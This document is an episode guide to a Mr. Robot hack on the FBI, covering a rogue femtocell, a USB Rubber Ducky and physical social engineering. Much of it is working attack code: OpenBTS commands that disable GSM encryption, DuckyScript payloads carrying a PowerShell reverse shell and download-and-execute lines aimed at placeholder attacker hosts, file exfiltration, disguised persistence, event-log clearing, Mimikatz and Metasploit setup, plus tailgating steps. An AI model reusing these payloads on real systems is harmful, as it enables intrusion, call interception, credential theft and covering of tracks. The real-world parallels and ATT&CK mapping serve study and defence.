# Season 2, Episode 9: eps2.7_init_5.fve -- THE FBI FEMTOCELL HACK

## Episode Overview

**This is the most important and technically detailed hack of Season 2.** The episode title references `init 5` (runlevel 5, full graphical multi-user mode -- the system is fully operational) and `.fve` (BitLocker Full Volume Encryption). After episodes of careful preparation, fsociety executes its audacious plan to hack the FBI by combining a modified femtocell, a USB Rubber Ducky, and Angela Moss's social engineering skills. The operation unfolds in five distinct phases, each demonstrating different attack techniques, and results in fsociety gaining access to the FBI's investigation files on the 5/9 hack. This episode is widely regarded as one of the most technically accurate and elaborate hacking sequences ever depicted on television.

---

## Hacks & Techniques

### Phase 1: Femtocell Hardware Preparation and Firmware Modification

The femtocell has been under construction throughout the season. It is now a fully operational rogue cellular base station capable of intercepting phone calls, SMS messages, and data from FBI agents' mobile devices.

**Hardware Assembly:**

The completed femtocell device includes:

| Component | Function | Approximate Cost |
|---|---|---|
| Software Defined Radio (e.g., USRP B210) | Transmit/receive cellular signals | $1,100-$2,500 |
| Single board computer (Raspberry Pi/Intel NUC) | Run the cellular stack software | $35-$300 |
| GPS Disciplined Oscillator (GPSDO) | Provide accurate timing for GSM | $50-$200 |
| Broadband cellular antenna | Radiate and receive RF | $20-$100 |
| RF power amplifier | Boost signal for range | $50-$300 |
| RF filters/duplexer | Clean up transmitted signal | $30-$100 |
| Power supply / battery pack | Portable power | $20-$50 |
| Custom enclosure | Disguise the device | $20-$50 |

**Firmware Modification Process:**

The femtocell's firmware (the software running on its embedded processor) is modified to enable interception capabilities that a legitimate femtocell would not provide:

1. **Firmware extraction**: Dump the original firmware from the device
2. **Firmware analysis**: Reverse engineer the firmware to understand its structure
3. **Modification**: Patch the firmware to:
   - Disable encryption requirements (force A5/0 or A5/1 instead of A5/3)
   - Enable traffic logging/recording
   - Add remote access capability
   - Modify Cell ID and network identity to mimic the legitimate carrier
   - Add selective targeting (only intercept specific IMSI numbers)
4. **Reflashing**: Write the modified firmware back to the device

```bash
# Example firmware modification workflow
# Extract firmware from device
binwalk -e firmware.bin

# Analyze extracted filesystem
find _firmware.bin.extracted/ -type f -name "*.conf" -o -name "*.cfg"

# Modify cellular stack configuration
# (Specific to the GSM software being used -- OpenBTS/YateBTS/OsmocomBB)

# Repack and flash modified firmware
mkimage -A arm -T firmware -C none -d modified_firmware.bin output.img
```

**Cellular Interception Configuration:**

```bash
# OpenBTS configuration for interception
# Disable encryption (force A5/0)
sqlite3 /etc/OpenBTS/OpenBTS.db \
  "UPDATE CONFIG SET VALUESTRING='0' WHERE KEYSTRING='GSM.Cipher.Encrypt'"

# Set network identity to match target carrier
sqlite3 /etc/OpenBTS/OpenBTS.db \
  "UPDATE CONFIG SET VALUESTRING='310' WHERE KEYSTRING='GSM.Identity.MCC'"
sqlite3 /etc/OpenBTS/OpenBTS.db \
  "UPDATE CONFIG SET VALUESTRING='260' WHERE KEYSTRING='GSM.Identity.MNC'"

# Set transmit power (higher = more range, more conspicuous)
sqlite3 /etc/OpenBTS/OpenBTS.db \
  "UPDATE CONFIG SET VALUESTRING='20' WHERE KEYSTRING='GSM.Radio.PowerManager.MaxAttenDB'"

# Enable call/SMS logging
sqlite3 /etc/OpenBTS/OpenBTS.db \
  "UPDATE CONFIG SET VALUESTRING='1' WHERE KEYSTRING='SIP.LogAllCalls'"
```

### Phase 2: USB Rubber Ducky Keystroke Injection

The second component of the attack is a USB Rubber Ducky -- a keystroke injection tool that looks like an ordinary USB flash drive but actually emulates a keyboard and types pre-programmed commands at superhuman speed.

**What Is a USB Rubber Ducky:**

- **Manufacturer**: Hak5 (a well-known security tool company)
- **Appearance**: Looks like a normal USB flash drive
- **Function**: When plugged into a computer, it identifies itself as a USB HID (Human Interface Device) keyboard
- **Speed**: Can type thousands of keystrokes per second
- **Payload**: Commands are written in DuckyScript and stored on a microSD card
- **Advantage**: Because it appears as a keyboard (not a storage device), it bypasses USB mass storage restrictions and most endpoint protection

**Why Keyboards Are Trusted:**

Operating systems inherently trust keyboard input. When a USB device identifies itself as a keyboard, the OS:
- Immediately loads keyboard drivers (no user approval needed)
- Accepts all "typed" input as legitimate user commands
- Does not apply the same restrictions as storage devices
- Cannot easily distinguish between a real keyboard and the Rubber Ducky

**DuckyScript Payload Language:**

DuckyScript is the scripting language for the Rubber Ducky. It supports:

- `DELAY` -- Wait a specified number of milliseconds
- `STRING` -- Type a string of characters
- `ENTER` -- Press the Enter key
- `GUI` -- Press the Windows/Command key
- `ALT`, `CTRL`, `SHIFT` -- Modifier keys
- `REPEAT` -- Repeat the previous command

**Example: PowerShell Reverse Shell Payload:**

```
REM USB Rubber Ducky payload for Windows reverse shell
REM Targets FBI workstation -- opens PowerShell and establishes reverse connection
REM Total execution time: approximately 3-5 seconds

DELAY 1000
REM Wait for USB enumeration and driver loading

GUI r
REM Open Windows Run dialog (Win+R)

DELAY 500
REM Wait for Run dialog to appear

STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "IEX(New-Object Net.WebClient).DownloadString('http://[C2_SERVER]/payload.ps1')"
ENTER

DELAY 1000
REM Alternative: Inline reverse shell without download

GUI r
DELAY 500
STRING powershell -nop -w hidden -ep bypass -c "$client=New-Object System.Net.Sockets.TCPClient('[ATTACKER_IP]',443);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
ENTER
```

**More Sophisticated DuckyScript Payload (Staged):**

```
REM Stage 1: Open PowerShell as hidden process
DELAY 1000
GUI r
DELAY 500
STRING cmd /c start /min powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM Stage 2: Download and execute payload
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "Start-BitsTransfer -Source 'https://[C2]/stager.ps1' -Destination $env:TEMP\s.ps1; & $env:TEMP\s.ps1"
ENTER

REM Stage 3: Clean up evidence
DELAY 3000
GUI r
DELAY 500
STRING powershell -w hidden -c "Remove-Item $env:TEMP\s.ps1 -Force; Clear-EventLog -LogName 'Windows PowerShell' -EA SilentlyContinue"
ENTER
```

### Phase 3: Angela's Physical Social Engineering

Angela Moss, coached by Darlene, physically enters the FBI's New York field office and deploys both the femtocell and the USB Rubber Ducky. This is the human element of the attack and arguably the most critical phase -- all the technical sophistication is worthless without physical access.

**Social Engineering Techniques Used:**

**Pretexting:**
Angela leverages her position as an E Corp employee to create a legitimate reason for visiting the FBI office. The pretext involves an ongoing FBI investigation into E Corp where Angela has a plausible role.

**Preparation and Coaching:**

Darlene coaches Angela on:

1. **Cover story**: A detailed, rehearsed explanation for her presence that withstands questioning
2. **Confidence and demeanor**: Appearing nervous or evasive would raise suspicion; Angela must project calm authority
3. **Target identification**: Knowing which FBI agents are working the case and where they sit
4. **Timing**: When to enter, how long to stay, when the office is most/least busy
5. **Device placement**: Where to plug in the Rubber Ducky (an unattended workstation) and where to place the femtocell (central location for maximum signal coverage)
6. **Escape plan**: How to leave naturally without arousing suspicion

**Physical Social Engineering Techniques:**

- **Tailgating/Piggybacking**: Following an authorized person through a secured door. Angela enters secure areas by walking closely behind FBI agents who badge through.

- **Pretexting authority**: Using her E Corp credentials and confidence to imply she has authorization to be in specific areas.

- **Distraction**: Creating diversions to give herself unobserved time at workstations.

- **Shoulder awareness**: Maintaining awareness of who is watching and choosing moments when no one is looking to deploy devices.

**Device Deployment Sequence:**

```
Step 1: Enter FBI building with legitimate visitor credentials
Step 2: Navigate to the correct floor (where E Corp case team works)
Step 3: Identify an unattended workstation
Step 4: Plug USB Rubber Ducky into the workstation
     -> Ducky executes in 3-5 seconds
     -> Establishes reverse shell to fsociety C2 server
Step 5: Remove the Rubber Ducky (leaves no physical evidence)
Step 6: Place the femtocell in a concealed location
     -> Under a desk, behind equipment, in a utility area
     -> Device is battery-powered or plugged into a wall outlet
Step 7: Exit the building naturally
```

### Phase 4: Femtocell Deployment and Cellular Interception

Once placed inside the FBI office, the femtocell begins operating as a rogue base station.

**IMSI Catching Process:**

```
FBI Agent's Phone                    Rogue Femtocell
      |                                    |
      |  [Phone scans for strongest       |
      |   signal on its frequency]         |
      |                                    |
      |  "I see a strong cell tower!"      |
      |  [Femtocell signal > legitimate]   |
      |                                    |
      |  Location Update Request (IMSI)    |
      |----------------------------------->|
      |                                    |
      |  [Femtocell captures IMSI]         |
      |  [Forces downgrade to A5/0]        |
      |                                    |
      |  Authentication Request            |
      |<-----------------------------------|
      |                                    |
      |  Authentication Response           |
      |----------------------------------->|
      |                                    |
      |  [Phone connected to femtocell]    |
      |  [All traffic passes through       |
      |   attacker's device]               |
```

**What the Femtocell Captures:**

- **IMSI numbers**: Unique identifiers for every phone that connects
- **Voice calls**: Recorded or streamed in real-time
- **SMS messages**: Captured in plaintext (2G/GSM has no end-to-end encryption for SMS)
- **Data traffic**: Web browsing, email, app data (if using 2G downgrade)
- **Location data**: Signal strength triangulation within the building
- **Call metadata**: Who called whom, when, and for how long

### Phase 5: Data Exfiltration from FBI Network

The Rubber Ducky's reverse shell provides a foothold on the FBI's internal network. From there, fsociety can exfiltrate investigation data.

**Reverse Shell Architecture:**

```
FBI Workstation                    fsociety C2 Server
     |                                    |
     |  [PowerShell reverse shell         |
     |   established by Rubber Ducky]     |
     |                                    |
     |  Outbound HTTPS to C2             |
     |----------------------------------->|
     |                                    |
     |  [Encrypted tunnel looks like      |
     |   normal HTTPS traffic]            |
     |                                    |
     |  Commands from attacker            |
     |<-----------------------------------|
     |                                    |
     |  [Execute commands on FBI network] |
     |  [Enumerate shares, databases,     |
     |   file servers]                    |
     |                                    |
     |  Exfiltrated data (encrypted)      |
     |----------------------------------->|
```

**PowerShell Post-Exploitation Commands:**

```powershell
# Enumerate the network
Get-NetComputer -Filter * | Select-Object Name, OperatingSystem
Get-NetShare -ComputerName FILE_SERVER

# Find sensitive files
Get-ChildItem -Path \\FILE_SERVER\CaseFiles -Recurse -Include *.pdf,*.docx,*.xlsx

# Search for E Corp case files
Get-ChildItem -Path C:\Users -Recurse -Include *ecorp*,*fsociety*,*5_9* -ErrorAction SilentlyContinue

# Download case files
Copy-Item "\\FILE_SERVER\Cases\ECorp_Investigation\*" -Destination $env:TEMP\exfil\ -Recurse

# Compress and exfiltrate
Compress-Archive -Path $env:TEMP\exfil -DestinationPath $env:TEMP\data.zip
$bytes = [System.IO.File]::ReadAllBytes("$env:TEMP\data.zip")
Invoke-WebRequest -Uri "https://[C2_SERVER]/upload" -Method POST -Body $bytes

# Clean up
Remove-Item $env:TEMP\exfil -Recurse -Force
Remove-Item $env:TEMP\data.zip -Force
Clear-EventLog -LogName Security -ErrorAction SilentlyContinue
```

**Maintaining Persistence (if needed):**

```powershell
# Registry-based persistence
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "WindowsUpdate" `
  -Value "powershell -w hidden -ep bypass -c `"IEX(New-Object Net.WebClient).DownloadString('https://[C2]/persist.ps1')`""

# Scheduled task persistence
$Action = New-ScheduledTaskAction -Execute "powershell.exe" `
  -Argument "-w hidden -ep bypass -c `"IEX(New-Object Net.WebClient).DownloadString('https://[C2]/persist.ps1')`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "WindowsDefenderUpdate" -Action $Action -Trigger $Trigger
```

### Combined Attack Summary

The genius of this attack is the combination of multiple techniques:

```
+-------------------+     +------------------+     +--------------------+
|  FEMTOCELL        |     | USB RUBBER DUCKY |     | SOCIAL ENGINEERING |
|  (Cellular MITM)  |     | (Keystroke Inj.) |     | (Physical Access)  |
+-------------------+     +------------------+     +--------------------+
         |                        |                          |
         v                        v                          v
+------------------------------------------------------------------+
|                    COMBINED ATTACK RESULT                          |
|                                                                    |
|  1. Cellular interception of FBI agents' phone communications     |
|  2. Reverse shell on FBI internal network                         |
|  3. Access to case files, evidence, and investigation status      |
|  4. Real-time intelligence on FBI's knowledge of fsociety         |
+------------------------------------------------------------------+
```

---

## Tools Used

| Tool | Purpose |
|---|---|
| **USB Rubber Ducky (Hak5)** | Keystroke injection attack platform |
| **DuckyScript** | Payload programming language for Rubber Ducky |
| **OpenBTS / YateBTS / OsmocomBB** | GSM base station software for femtocell |
| **USRP B210 (or similar SDR)** | Software Defined Radio hardware |
| **PowerShell** | Post-exploitation and reverse shell on Windows |
| **Metasploit (msfvenom)** | Payload generation for reverse shells |
| **Empire / PowerShell Empire** | PowerShell post-exploitation framework |
| **GNU Radio** | Signal processing for SDR components |
| **Wireshark** | Network traffic analysis and protocol decoding |
| **binwalk** | Firmware extraction and analysis |

---

## Commands Shown

**Compiling DuckyScript Payload:**

```bash
# Using the Hak5 DuckyScript encoder
# Convert DuckyScript to inject.bin for the microSD card
java -jar duckencoder.jar -i payload.txt -o inject.bin -l us

# Copy payload to Rubber Ducky's microSD card
cp inject.bin /media/ducky/inject.bin

# Alternative: Use the DuckToolkit (Python)
pip install ducktoolkit
ducktoolkit encode -i payload.txt -o inject.bin -l us
```

**Generating PowerShell Reverse Shell with msfvenom:**

```bash
# Generate encoded PowerShell reverse shell payload
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker_ip LPORT=443 \
  -f psh-cmd -o payload.ps1

# Generate base64-encoded PowerShell command
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker_ip LPORT=443 \
  -f psh-reflection -e cmd/powershell_base64single
```

**Setting Up the Metasploit Listener:**

```bash
# Start Metasploit listener for reverse shell
msfconsole -q -x "
use exploit/multi/handler;
set PAYLOAD windows/x64/meterpreter/reverse_https;
set LHOST 0.0.0.0;
set LPORT 443;
set ExitOnSession false;
exploit -j
"
```

**Femtocell Operation Commands:**

```bash
# Start the cellular base station
sudo OpenBTS &

# Monitor connected devices (IMSI numbers)
sqlite3 /var/run/OpenBTS/SubscriberRegistry.db \
  "SELECT IMSI, IMEI, datetime(accessed, 'unixepoch') FROM SIP_BUDDIES"

# Monitor call records
tail -f /var/log/OpenBTS/calls.log

# Capture SMS messages
tail -f /var/log/OpenBTS/sms.log

# Monitor signaling traffic
tshark -i lo -f "port 5060" -Y "sip" -V
```

**Post-Exploitation on FBI Network:**

```powershell
# Situational awareness
whoami /all
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Domain"
ipconfig /all
net user /domain
net group "Domain Admins" /domain

# Network enumeration
net view /domain
net share
arp -a
netstat -ano

# Credential harvesting (if elevated)
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Data staging and exfiltration
$files = Get-ChildItem -Path "\\FBISERVER\CaseFiles" -Recurse -Include *.pdf,*.docx
foreach ($f in $files) { Copy-Item $f.FullName -Destination "C:\Temp\staging\" }
Compress-Archive -Path "C:\Temp\staging\*" -DestinationPath "C:\Temp\out.zip"
```

---

## Real-World Parallels

### DEF CON Femtocell Research

The show's technical consultants directly reference research presented at DEF CON by **iSEC Partners** (now part of NCC Group):

- **"I Can Hear You Now: Traffic Interception and Remote Mobile Phone Cloning with a Compromised CDMA Femtocell" (DEF CON 21, 2013)**: Doug DePerry and Tom Ritter demonstrated hacking commercial Verizon femtocells to intercept calls and clone phones. They showed that the femtocell's firmware could be modified to capture voice, SMS, and data, and even clone the identity of connected phones.

- **Key findings from the research:**
  - Commercial femtocells run embedded Linux and can be rooted
  - IPsec tunnels back to the carrier can be intercepted
  - Voice calls pass through the femtocell in the clear before encryption
  - CDMA authentication secrets can be extracted, allowing phone cloning

### USB Rubber Ducky and Keystroke Injection Attacks

- **Hak5 Rubber Ducky**: A real commercial product available for approximately $50-80. It has been used in countless penetration tests and red team engagements.

- **BadUSB (2014)**: Security researchers Karsten Nohl and Jakob Lell demonstrated at Black Hat that any USB device's firmware could be modified to impersonate other device types (keyboard, network adapter, etc.). This showed that the Rubber Ducky concept could be extended to any USB device.

- **USB Armory**: A USB-stick-sized computer that can act as a full attack platform, going far beyond simple keystroke injection.

- **O.MG Cable**: A Lightning/USB cable that contains a hidden Wi-Fi-enabled implant capable of keystroke injection, making it indistinguishable from a normal charging cable.

### Social Engineering Penetration Tests

- **Chris Nickerson's TrustedSec**: Professional penetration testers regularly gain physical access to corporate and government buildings using techniques similar to Angela's. The success rate of social engineering is alarmingly high even against security-conscious organizations.

- **Jayson Street**: A well-known penetration tester who has walked into banks in multiple countries, plugged devices into their networks, and exfiltrated data -- often being thanked by staff for his visit.

- **Physical penetration testing** of government facilities is a real service offered by security firms. The techniques shown in the episode (pretexting, tailgating, distraction) are standard methodology.

### PowerShell-Based Attacks

- **PowerShell Empire**: A post-exploitation framework built entirely on PowerShell. It was widely used by both penetration testers and real threat actors before being "retired" and then forked as Starkiller/Empire.

- **Living off the Land (LOL)**: The use of PowerShell for attacks exemplifies the "living off the land" approach where attackers use tools already present on the target system (PowerShell is built into every modern Windows installation), making detection much harder.

- **MITRE ATT&CK**: PowerShell is one of the most commonly observed techniques in the ATT&CK framework, used by threat actors ranging from script kiddies to nation-state APT groups.

### The Multi-Vector Approach

The episode's combination of physical social engineering, hardware implants, and software exploitation mirrors real-world advanced persistent threat (APT) operations:

- **Equation Group (NSA TAO)**: Leaked documents and tools revealed that the NSA's Tailored Access Operations unit used remarkably similar techniques -- custom hardware implants (COTTONMOUTH, RAGEMASTER), firmware modification, and social engineering for physical access.

- **APT28 (Fancy Bear)**: Russian military intelligence has used a combination of spearphishing, custom malware, and physical operations to compromise targets.

- **The Mr. Robot approach** of combining multiple attack vectors into a single coordinated operation is exactly how real sophisticated attacks work -- no single technique is sufficient on its own, but together they overcome layered defenses.

---

## Tool Links

| Tool | Link |
|---|---|
| USB Rubber Ducky | https://shop.hak5.org/products/usb-rubber-ducky |
| OpenBTS | http://openbts.org/ |
| YateBTS | https://yatebts.com/ |
| GNU Radio | https://www.gnuradio.org/ |
| USRP (Ettus Research) | https://www.ettus.com/ |
| HackRF | https://greatscottgadgets.com/hackrf/ |
| Metasploit | https://www.metasploit.com/ |
| Wireshark | https://www.wireshark.org/ |
| Cobalt Strike | https://www.cobaltstrike.com/ |

---

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| USB Rubber Ducky (added hardware) | T1200 | Hardware Additions | https://attack.mitre.org/techniques/T1200/ |
| Keystroke injection via USB | T1091 | Replication Through Removable Media | https://attack.mitre.org/techniques/T1091/ |
| PowerShell reverse shell | T1059 | Command and Scripting Interpreter | https://attack.mitre.org/techniques/T1059/ |
| Femtocell IMSI catcher (cellular MITM) | T1557 | Adversary-in-the-Middle | https://attack.mitre.org/techniques/T1557/ |
| Social engineering for physical access | T1566 | Phishing | https://attack.mitre.org/techniques/T1566/ |
| Communications network sniffing | T1040 | Network Sniffing | https://attack.mitre.org/techniques/T1040/ |
| Data exfiltration via C2 | T1041 | Exfiltration Over C2 Channel | https://attack.mitre.org/techniques/T1041/ |
| Persistence via registry/scheduled task | T1547 | Boot or Logon Autostart Execution | https://attack.mitre.org/techniques/T1547/ |
| Local system data collection | T1005 | Data from Local System | https://attack.mitre.org/techniques/T1005/ |
| Tool transfer | T1105 | Ingress Tool Transfer | https://attack.mitre.org/techniques/T1105/ |
| Indicator removal (log cleanup) | T1070 | Indicator Removal | https://attack.mitre.org/techniques/T1070/ |

---

## References and Further Reading

- **DEF CON 21 - iSEC Partners Femtocell Research (2013)**: "I Can Hear You Now" - Doug DePerry and Tom Ritter demonstrated CDMA femtocell hacking.
- **Black Hat 2014 - BadUSB**: Karsten Nohl and Jakob Lell demonstrated firmware-level USB attacks.
- **Hak5 USB Rubber Ducky Documentation**: https://shop.hak5.org/products/usb-rubber-ducky - Official product page and DuckyScript documentation.
- **SANS Institute - PowerShell for Penetration Testing**: https://www.sans.org/white-papers/ - Papers on PowerShell-based attacks and defenses.
- **NSA TAO ANT Catalog (Leaked)**: Documentation of NSA hardware implants including COTTONMOUTH USB implants.
- **MITRE ATT&CK - PowerShell (T1059.001)**: https://attack.mitre.org/techniques/T1059/001/ - Documentation of PowerShell use in real-world attacks.

---

## Search Tags

```
tags: [femtocell, usb-rubber-ducky, social-engineering, powershell, reverse-shell, imsi-catcher, metasploit, keystroke-injection, hak5, openbts, yatebts, gnu-radio, cobalt-strike, exfiltration]
season: 2
episode: 9
mitre: [T1200, T1091, T1059, T1557, T1566, T1040, T1041, T1547, T1005, T1105, T1070]
```
